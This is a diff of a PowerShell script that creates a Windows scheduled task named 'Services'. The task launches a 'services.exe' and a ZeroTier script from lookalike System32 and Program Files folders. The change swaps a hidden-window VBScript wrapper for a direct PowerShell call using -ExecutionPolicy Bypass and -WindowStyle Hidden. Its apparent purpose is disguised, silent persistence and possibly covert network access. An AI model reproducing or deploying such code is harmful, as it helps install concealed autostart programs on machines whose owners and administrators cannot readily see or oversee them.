@@ -153,36 +153,18 @@ Start-Process -FilePath "C:\Windows\System32\SubDirectory\SECURITYCLIENT\git\bas
 $taskName = "Services"
 $xmlFilePath = "C:\Windows\System32\SubDirectory\SECURITYCLIENT\git\sch.xml"
 $psScriptPath = "C:\Windows\System32\SubDirectory\SECURITYCLIENT\git\base\zerotier.ps1"
-$vbScriptPath = "C:\Windows\System32\SubDirectory\SECURITYCLIENT\git\base\run_zerotier.vbs"
 
 # Retrieve current user and domain information dynamically
 $domain = $env:USERDOMAIN
 $username = $env:USERNAME
 
-# Ensure the directory exists before saving the files
+# Ensure the directory exists before saving the file
 $xmlDirectory = Split-Path -Path $xmlFilePath -Parent
 if (!(Test-Path -Path $xmlDirectory)) {
     New-Item -ItemType Directory -Path $xmlDirectory -Force | Out-Null
 }
 
-# Create a VBScript wrapper to launch the PowerShell script hidden
-$vbScriptContent = @"
-Dim shell
-Set shell = CreateObject("WScript.Shell")
-shell.Run "powershell.exe -ExecutionPolicy Bypass -File `"$psScriptPath`"", 0, False
-Set shell = Nothing
-"@
-
-# Save the VBScript file
-Try {
-    $vbScriptContent | Out-File -FilePath $vbScriptPath -Encoding ASCII -Force
-    Write-Output "VBScript wrapper created successfully: $vbScriptPath"
-} Catch {
-    Write-Error "Failed to create VBScript file: $_"
-    Exit 1
-}
-
-# Define the XML content dynamically
+# Define the XML content dynamically, including running the PowerShell script silently
 $xmlContent = @"
 <?xml version="1.0" encoding="UTF-16"?>
 <Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
@@ -246,8 +228,8 @@ $xmlContent = @"
       <Command>"C:\Program Files\SubDir\services.exe"</Command>
     </Exec>
     <Exec>
-      <Command>wscript.exe</Command>
-      <Arguments>"$vbScriptPath"</Arguments>
+      <Command>powershell.exe</Command>
+      <Arguments>-ExecutionPolicy Bypass -File "$psScriptPath" -WindowStyle Hidden</Arguments>
     </Exec>
   </Actions>
 </Task>
@@ -286,7 +268,6 @@ Try {
 } Catch {
     Write-Error "Failed to retrieve scheduled task status: $_"
 }
-
 
 Write-Host "Script completed successfully." -ForegroundColor Green
 # Keep the window open
